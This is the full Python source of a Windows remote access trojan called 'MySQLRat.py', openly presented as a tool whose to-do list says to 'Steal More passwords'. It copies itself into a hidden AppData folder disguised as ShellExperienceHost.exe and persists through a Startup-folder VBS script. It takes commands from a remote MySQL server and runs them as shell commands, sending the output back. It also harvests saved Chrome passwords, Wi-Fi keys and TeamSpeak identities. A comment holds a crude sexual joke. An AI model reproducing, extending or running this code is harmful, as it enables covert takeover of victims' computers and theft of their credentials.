#!/usr/bin/python
# -*- coding: utf-8 -*-

#################################################################################################################
#   Author: Ramzi Sah
#   ProjectName: MySQLRat.py
#   Version: 2.0

#   description:
#       Python MySQL Remote Administrative Tool
#       Wrote Under python 3.6 Windows

#   Disclaimer :
#       * Not liable for any damage incurred from use of this software
#        Including but not limited to : temporary paralysis, spontaneous combustion and premature hair loss

#   To do :
#       * Make it Steal More passwords !
#       * Get list of processes and kill them 
#       * Work more on the panel
#       * May add UnInstall Batch Script
#       * Ts3IdentityStealer() -> Need Revise ( Team speak DataBase Parsing Difficulties )
#       * Steam Passwords

#   Improvements: 
#       * full Compatibility with Pyinstaller
#       * debug function that prints error on the Shell and Log them on a file
#       * Start With windows (vbs hidden file)
#       * Steal Chrome Passwords
#       * Obfuscate DB Config informations ;)
#       * Msg Boxes && Speak voice (male & female)
#       * [ Fixed ] Windows UUID Change on Reboot ?
#################################################################################################################


#################################################################################################################
############################################# - Configuration - #################################################
#################################################################################################################
# Basic Cfg
EnableDebugLog = True
UseEncryptedConfig = False

# If Compiled
HidePayload = False # working only if compiled / [important] need to be False if not compiled
AppDataDirectoryName = 'WindowsService' # Hidden Folder that will contain the payload
CompiledAppName = 'ShellExperienceHost.exe' # final name of Compiled Binary

# LocalHost DB Configs
DB_Cfg_Host = ''
DB_Cfg_Port = 3306 # integer / 3306 default mysql server port
DB_Cfg_Username = ''
DB_Cfg_Password = ''
DB_Cfg_Name = ''

# Real-World DB Encrypted Configs
EncryptedData = """

"""

#################################################################################################################
#############################################  - Main Script -  #################################################
#################################################################################################################
# import some Librarys
import os, sys, subprocess, shutil, time, ast, string, random, base64
import sqlite3,win32crypt
import MySQLdb

########################################### Functions ###########################################
def MySweetHeader() :
    Header = """
     /$$      /$$            /$$$$$$   /$$$$$$  /$$             /$$$$$$$   /$$$$$$  /$$$$$$$$
    | $$$    /$$$           /$$__  $$ /$$__  $$| $$            | $$__  $$ /$$__  $$|__  $$__/
    | $$$$  /$$$$ /$$   /$$| $$  \__/| $$  \ $$| $$            | $$  \ $$| $$  \ $$   | $$   
    | $$ $$/$$ $$| $$  | $$|  $$$$$$ | $$  | $$| $$            | $$$$$$$/| $$$$$$$$   | $$   
    | $$  $$$| $$| $$  | $$ \____  $$| $$  | $$| $$            | $$__  $$| $$__  $$   | $$   
    | $$\  $ | $$| $$  | $$ /$$  \ $$| $$/$$ $$| $$            | $$  \ $$| $$  | $$   | $$   
    | $$ \/  | $$|  $$$$$$$|  $$$$$$/|  $$$$$$/| $$$$$$$$      | $$  | $$| $$  | $$   | $$   
    |__/     |__/ \____  $$ \______/  \____ $$$|________/      |__/  |__/|__/  |__/   |__/   
                  /$$  | $$                \__/                                              
                 |  $$$$$$/                                                                  
                  \______/                                                                    
    """
    print(Header)
    print("     \tToday this Computer, Tomorrow THE WORLD ...")
    print("     By Ramzi Sah\n")
    time.sleep(2)
    return

def Hide() :
    global AppDirectory
    AppDirectory_notSafe = os.path.dirname(sys.argv[0])
    AppDirectory_safe = str(str(os.environ['APPDATA'])+"\\"+AppDataDirectoryName)
    AppDirectory = AppDirectory_safe
    
    if HidePayload :
        if str(AppDirectory_notSafe) == str(AppDirectory_safe) :
            print('[Debugging Log] : Payload alredy hidded !')
        else :
            if not os.path.exists(AppDirectory_safe) :
                os.makedirs(AppDirectory_safe)
            shutil.copyfile(sys.argv[0], AppDirectory_safe + "\\" + CompiledAppName)
            AppDirectory = AppDirectory_safe            
            subprocess.call(["start" ,AppDirectory_safe + "\\" + CompiledAppName] ,shell=True,stdout = subprocess.PIPE ,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            sys.exit(0)
        # Change attribute as hidden Directory
        try :
            subprocess.call(["attrib" ,"+S","+H" ,AppDirectory] ,shell=True,stdout = subprocess.PIPE ,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            print('[Debugging Log] : Payload Sucssessfully hidded !')
        except Exception as error :
            print('[Debugging Log] : [Error Log] Error while trying to hide Payload :\n' + str(error) + "\n")
    return

def Debug(Message) :
    Message = "[Debugging Log] : " + str(Message)
    print(Message)
    Message += "\n"
    if EnableDebugLog :
        f= open(DataAppDirectory+'\\Logs.Log',"a+")
        f.write(Message)
        f.close() 
    return

def ClientLocalData() :
    global ClientLocalInfo,DataAppDirectory
    ClientLocalInfo = {}
    ClientLocalInfo['COMPUTERNAME'] = str(os.environ['COMPUTERNAME'])
    # ClientLocalInfo['TEMP'] = str(os.environ['TEMP']) # not needed for now
    ClientLocalInfo['APPDATA'] = str(os.environ['APPDATA'])
    ClientLocalInfo['LOCALAPPDATA'] = str(os.environ['LOCALAPPDATA'])
    ClientLocalInfo['StartupFolder'] = ClientLocalInfo['APPDATA'] + "\Microsoft\Windows\Start Menu\Programs\Startup"
    ClientLocalInfo['DESKTOP'] = os.environ['HOMEPATH'] + '\\DESKTOP'

    DataAppDirectory = AppDirectory + "\\" + "Data"
    print("[Debugging Log] : Data Directory '"+DataAppDirectory+"'")
    if not os.path.exists(DataAppDirectory) :
        os.makedirs(DataAppDirectory)
    ClientLocalInfo['UUID'] = ClientIDGenerator()
    return

def ClientIDGenerator() :
    DataPath = DataAppDirectory + "\\ClientID.dat"
    if (os.path.isfile(DataPath) == True) :
        UniqueID = str(open(DataPath, 'r').read())
        Debug('ClientId Successfully Recovered ClientID : ' + UniqueID)
    else :
        UniqueIDGenerated = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(20))
        try :
            with open(DataPath, 'wb') as DataInfoFile :
                DataInfoFile.write((UniqueIDGenerated).encode('utf-8'))
            UniqueID = str(open(DataPath, 'r').read())
            Debug('ClientId Successfully Generated (ClientID : ' + UniqueID + ')')
        except Exception as error :
            Debug('[ Error Log ] : Error While Writing on ClientID Data File :\n' + str(error) + "\n")
            UniqueID = "Null"
    return UniqueID

def InitScript() :
    try :
        os.chdir(ClientLocalInfo['DESKTOP'])
        Debug('CHDIR Changed to Desktop')
    except Exception as error :
        Debug('[Error Log] : [Error Log] : Chdir Error : ' + str(error))
        CmdOutput = '[Error Log] : Chdir Error : ' + str(error)
    return

def ConnectMySQL() :
    global cursor,db
    try :
        # Open database connection
        db = MySQLdb.connect(DB_Cfg_Host,DB_Cfg_Username,DB_Cfg_Password,DB_Cfg_Name,DB_Cfg_Port)
        db.set_character_set('utf8')
        # prepare a cursor object using cursor() method
        cursor = db.cursor()
        if (ConnectionStatus) : Debug('[Sucssess] Sucssessfuly Connected to the DataBase ')
        return True
    except (MySQLdb.Error, MySQLdb.Warning) as error :
        Debug('\n[Error Log] : Error While Trying to Connect to DB\n '+str(error)+' \nTry to Reconnect ...')
        return False
    return

def ClientConnectDB() :
    # Check if Client Already Registered
    AlreadyRegistered = False
    CanConnect = False
    cursor.execute("SELECT * FROM clients where UUID='"+ClientLocalInfo['UUID']+"'")
    for row in cursor.fetchall() :
        if row[2] == ClientLocalInfo['UUID'] : AlreadyRegistered = True
    if not AlreadyRegistered :
        try :
           cursor.execute("INSERT INTO clients(UUID, Name, Info) VALUES('"+ ClientLocalInfo['UUID'] +"', '"+ ClientLocalInfo['COMPUTERNAME'] +"', '"+ "ZBEUB" +"')")
           db.commit()
           Debug('[Sucssess] Client Sucssessfuly Inserted on DB')
           CanConnect = True
        except (MySQLdb.Error, MySQLdb.Warning) as error :
           Debug('[Error Log] : Error While Insert to DB !\n '+str(error))
    else :
        Debug('Client Already Registered ')
        CanConnect = True
    if CanConnect :
        #Get Variables from DB
        cursor.execute("SELECT * FROM clients where UUID='"+ClientLocalInfo['UUID']+"'")
        global DB_ClientID
        for row in cursor.fetchall() :
            DB_ClientID = str(row[0])
            Debug('[Sucssess] Sucssessfuly granted Client Id : '+DB_ClientID)
    db.close()
    return

def ConnectionCheck() :
    if EnableDebugLog : print ('[Debugging Log] : Maintaning Connection to MySQL Server ...')
    cursor.execute ("update clients set Connected = 1 WHERE ID='"+DB_ClientID+"'")
    db.commit()
    return 0

def CMDExecution(command) :
    Debug('[ Command ] : Executing Command /> ' + command )
    # Change Directory
    if command[0:3] == 'cd ' and command[3:999] != '' :
        NewDirectory = str(command[3:999])
        Success = 0
        try :
            os.chdir(NewDirectory)
            CmdOutput = 'Changing Directory to '+ NewDirectory
            Success = 0
            Debug("[ Command ] : [Sucssess] Command successfully executed ")
        except (OSError) as error :
            CmdOutput = '[Error Log] : Chdir Error : ' + str(error)
            print (CmdOutput)
            Success = 1
    elif (command[0:7] == 'MsgBox ') :
        """
            # Critical Message 16
            # Warning Query 32
            # Warning Message 48
            # Information 64
            # {'Status': 0, 'Command': 'MsgBox 1,1,Ramzi Sah is handsome I enjoy socking his dick every day'}
        """
        try :
            Argument_Array = command[7:999].split(",")
            Passords_dict = VBSMsgBox(Argument_Array[2], Argument_Array[0], Argument_Array[1])
            CmdOutput = SafeDBSTR(Passords_dict['Output'])
            Success = Passords_dict['Success']
        except Exception as error :
            Debug('[Command Error Log] : There Was an error While trying to execute the Command :\n ' + str(error) + '\n')
            CmdOutput = 'UNKNOWN Error' + SafeDBSTR(str(error))
            Success = 1
    elif (command == '0') :
        Passords_dict = ChromePassStealer()
        CmdOutput = SafeDBSTR(Passords_dict['Output'])
        Success = Passords_dict['Success']
    elif (command == '1') :
        Passords_dict = WifiPassStealer()
        CmdOutput = SafeDBSTR(Passords_dict['Output'])
        Success = Passords_dict['Success']
    elif (command == '2') :
        Passords_dict = Ts3IdentityStealer()
        CmdOutput = SafeDBSTR(Passords_dict['Output'])
        Success = Passords_dict['Success']
    else :
        # Execute Shell Command
        try :
            CommandId = subprocess.Popen(command+' > "'+DataAppDirectory+'\\TMP_CMD_OUTPUT"', shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, universal_newlines=True)
            Out, err = CommandId.communicate('\n')
            CmdOutput = str(open(DataAppDirectory+'\\TMP_CMD_OUTPUT', 'r').read())
            Success = CommandId.returncode
            if Success == 0 :
                Debug("[ Command Log ] : [Success] Command successfully executed " + Out)
            else :
                Debug("[ Command Log ] : Error While Trying to Execute Command : " + err)
                CmdOutput = str(err)
        except Exception as error :
            Debug('[Command Error Log] : There Was an error While trying to execute the Command :\n ' + str(error) + '\n')
            CmdOutput = 'UNKNOWN Error'
            Success = 1
    # Get output
    Output = {'Success':Success,'CmdOutput':SafeDBSTR(CmdOutput)}
    Debug('Returning Output : \n' + str(Output) )
    return Output

def Get_CMD_DB() :
    try :
        #Get Commands from DB
        cursor.execute("SELECT * FROM clients where UUID='"+ClientLocalInfo['UUID']+"'")
        for row in cursor.fetchall() :
            Array_DB_Commands_GET = ast.literal_eval(row[5]) # {'Status': 0,'Command': 'Cd Directory'}
        if Array_DB_Commands_GET['Status'] == 0 :
            try :
                Output = str(CMDExecution(Array_DB_Commands_GET['Command']))
                cursor.execute ("update clients set CMDOutput = \""+str(Output)+"\" WHERE ID=\""+DB_ClientID+"\"")
                Array_DB_Commands_PUT = {'Status':1,'Command': SafeDBSTR(Array_DB_Commands_GET['Command'])}
                cursor.execute ("update clients set CMD = \""+str(Array_DB_Commands_PUT)+"\" WHERE ID=\""+DB_ClientID+"\"")
                db.commit()
            except Exception as error :
                Debug('[Error Log] : There Was an UNKNOWN ERROR : ' + str(error) + '\n')
    except Exception as error :
        Debug('[Error Log] : There Was an UNKNOWN ERROR : ' + str(error) + '\n')
    return

def SafeDBSTR(UnsafeSTR) :
    SafeSTR = str(UnsafeSTR).replace("'", " ").replace("\"", " ")
    return SafeSTR

def VBSStarter() :
    try :
        # Create StartUp VBS file
        VBSFile = open( ClientLocalInfo['StartupFolder'] + "\\VBSScript.vbs","w")
        VBSFile.write("On Error Resume Next\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run chr(34) & \""+AppDirectory+"\\"+CompiledAppName+"\" & Chr(34), 0\nSet WshShell = Nothing")
        VBSFile.close()
    except :
        Debug('[Error Log] : Can\'t create VBS file ')
    return

def ChromePassStealer() :
    info_list = []
    Success = 3
    # This is the Windows Path
    PathName = ClientLocalInfo['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\'
    if (os.path.isdir(PathName) == False) :
        Debug('Chrome Doesn\'t exists')
        Output = 'Error Chrome Not installed on device'
        Success = 1
    else :
        path = PathName
        try:
            connection = sqlite3.connect(path + "Login Data")
            with connection :
                cursor = connection.cursor()
                v = cursor.execute(
                    'SELECT action_url, username_value, password_value FROM logins')
                value = v.fetchall()
                
            for information in value :
                password = win32crypt.CryptUnprotectData(
                    information[2], None, None, None, 0)[1]
                if password :
                    info_list.append({
                        'origin_url': information[0],
                        'username': information[1],
                        'password': str(password)
                    })
        except sqlite3.OperationalError as error :
            Debug('There was an error when trying to read Passwords \n' + str(error))
            Output = 'Error On Chrome Data File : ' + str(error)
            Success = 1
        if Success != 1 :
            try :
                with open(DataAppDirectory+'\\ChromePass.csv', 'wb') as csv_file :
                    csv_file.write('\nGoogle Chrome Stored Passwords :\n'.encode('utf-8'))
                    for data in info_list :
                        csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data['username'], data['password'])).encode('utf-8'))
                    Debug('Chrome Data Successfully Recovered')
                Output = str(open(DataAppDirectory+'\\ChromePass.csv', 'r').read())
                Success = 0
            except Exception as error :
                Debug('Error on CSV File Creation ! : ' + str(error))
                Output = 'Error' + str(error)
                Success = 1
    ReturnOutput = {'Success':Success,'Output':Output}
    return ReturnOutput

def WifiPassStealer() :
    WifiProfiles = subprocess.Popen('netsh wlan show profiles > "'+DataAppDirectory+'\\WifiPass.csv"', shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, universal_newlines=True)
    time.sleep(1) # wait for Popen
    WifiProfiles = (str(open(DataAppDirectory+'\\WifiPass.csv', 'r').read())).split('\n')
    WifiProfiles = [i.split(":")[1][1:99] for i in WifiProfiles if "All User Profile" in i]
    try :
        with open(DataAppDirectory+'\\WifiPass.csv', 'wb') as csv_file :
            csv_file.write('\nWifi Stored Passwords :\n'.encode('utf-8'))
            for i in WifiProfiles :
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'],shell=True).decode('utf-8').split('\n')
                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                try :
                    csv_file.write(("  {:<12}: {:<}\n".format(i, results[0])).encode('utf-8'))
                except :
                    csv_file.write(("  {:<12}: {:<}\n".format(i, "")).encode('utf-8'))
        Output = str(open(DataAppDirectory+'\\WifiPass.csv', 'r').read())
        Success = 0
    except Exception as error :
        Debug('UNKNOWN Error : ' + str(error))
        Output = 'Error' + str(error)
        Success = 1
    ReturnOutput = {'Success':Success,'Output':Output}
    return ReturnOutput

def find_all(a_str, sub) :
    start = 0
    while True:
        start = a_str.find(sub, start)
        if start == -1: return
        yield start
        start += len(sub) # use start += 1 to find matches
# Ts3IdentityStealer() Need Revise
def Ts3IdentityStealer() :
    # This is the Windows Path
    PathName = ClientLocalInfo['APPDATA'] + '\\TS3Client\\'
    if (os.path.isdir(PathName) == False) :
        Debug('TS3 Doesn\'t exists')
        Output = 'Error TS3 Not installed on device'
        Success = 1
    else :
        path = PathName
        try :
            connection = sqlite3.connect(path + 'settings.db')
            with connection :
                cursor = connection.cursor()
                v = cursor.execute('SELECT * FROM protobufitems')
                value = v.fetchall()
                HexList = []
                FinalStr = ''
                for information in value :
                    parsedData = str(information[2])
                    FinalStr += "\n------------("+str(information[1])+")-------------\n"+parsedData
            RawData = list(find_all(FinalStr, "\\x"))
            for data in RawData :
                HexList.append(FinalStr[data:data+4])
            FinalHexList = list(set(HexList))
            for Hex in FinalHexList :
                FinalStr = FinalStr.replace(Hex,' ')
            with open(DataAppDirectory+'\\TSPASS.csv', 'wb') as csv_file :
                csv_file.write(FinalStr.encode('utf-8'))
            Output = SafeDBSTR(str(open(DataAppDirectory+'\\TSPASS.csv', 'r').read()))
            Success = 0
        except sqlite3.OperationalError as error :
            Debug('There was an error when trying to read Passwords \n' + str(error))
            Output = 'Error On TS3 Data File : ' + str(error)
            Success = 1
    ReturnOutput = {'Success':Success,'Output':Output}
    return ReturnOutput

def VBSMsgBox(Msg,Type,Info) :
    Path = DataAppDirectory + "\\MsgBox.vbs"
    if Type == "0" : 
        try :
            VBSFile = open(Path,"w")
            VBSFile.write("On Error Resume Next\ndim answer\nPopupMsg=MsgBox(\""+str(Msg)+"\","+str(Info)+",\"Messege From The System\")")
            VBSFile.close()
            subprocess.Popen(Path, shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, universal_newlines=True)
            Output = 'MsgBox Sucssessfully Sended'
            Success = 0
        except Exception as Error :
            print ('[Error Log] : Unknown Error : ' + str(Error))
            Output = 'Error : ' + str(Error)
            Success = 1
    elif Type == "1" :
        try :
            VBSFile = open(Path,"w")
            VBSFile.write("On Error Resume Next\nDim sapi\nSet sapi = CreateObject(\"SAPI.SpVoice\")\nwith sapi\n\tSet .voice = .getvoices.item("+str(Info)+")\n\t.Volume = 100\n\t.Rate = 0\nend with\nsapi.Speak \""+str(Msg)+"\"")
            VBSFile.close()
            subprocess.Popen(Path, shell=True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, universal_newlines=True)
            Output = 'Sucssessfully said ('+Msg+')'
            Success = 0
        except Exception as error:
            print ('[Error Log] : Unknown Error : ' + str(error))
            Output = 'Error : ' + str(error)
            Success = 1
    else :
        print ('Error UNKNOWN type : ' + str(Type))
        Output = 'Error UNKNOWN MsgBox type : ' + str(Type)
        Success = 1
    ReturnOutput = {'Success':Success,'Output':Output}
    return ReturnOutput

########################################### Script Init Manager ###########################################
ConnectionStatus = True
# Print a Sweet Header
MySweetHeader()
# hide the payload
Hide()
# Get Local Client Variables
ClientLocalData()
# Init Debug File
Debug("--------------- New Session -----------------")
# Start with Windows
VBSStarter()
# Connect To DB and Get Cursor Variable
if UseEncryptedConfig :
    eval(compile(base64.b64decode(EncryptedData),'<string>','exec'))
while not ConnectMySQL() :
    time.sleep(5)
ClientConnectDB() # Get Client DataBase ID Then db.close()
ConnectionStatus = False
# Init Some Script
InitScript()
########################################### Main Loop Execution ##########################################
print ('\n----------------------- Main Loop Execution -------------------------------')
while True :
    try :
        ConnectMySQL()
        ConnectionCheck()
        Get_CMD_DB()
        db.close()
    except (MySQLdb.Error, MySQLdb.Warning) as error :
        Debug('[ Error ] Something Went Wrong With Data Base :\n' + str(error))
        print ('[Error Log] : Error With DB Execution Trying To Reconnect ... \n')
    except Exception as error :
        if EnableDebugLog : print ('\n[Error Log] : UNKNOWN ERROR :\n' + str(error))
        print ('[Error Log] : Lost Connection Trying To Reconnect ... \n')
    time.sleep(2)

#############################################################################################################
#############################################################################################################
#############################################################################################################
################################################## ### ######################################################
